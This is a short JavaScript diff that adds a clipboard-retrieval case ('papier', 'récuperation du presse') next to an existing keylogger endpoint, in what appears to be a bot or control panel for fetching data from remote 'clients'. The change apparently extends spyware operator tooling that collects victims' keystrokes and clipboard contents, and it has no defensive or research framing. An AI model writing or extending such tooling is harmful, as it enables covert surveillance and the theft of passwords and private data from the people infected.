@@ -24,6 +24,11 @@ export async function fetchDataAndUpdateInteraction(type, interaction, clientId,
             endpoint = `keylogger/client/${clientId}`;
             contentType = "enregistrement du clavier";
             break;
+        case 'papier':
+            endpoint = `papier/client/${clientId}`;
+            contentType = "récuperation du presse";
+            break;
+
     }
 
     const url = `${API_BASE_URL}/${endpoint}`;
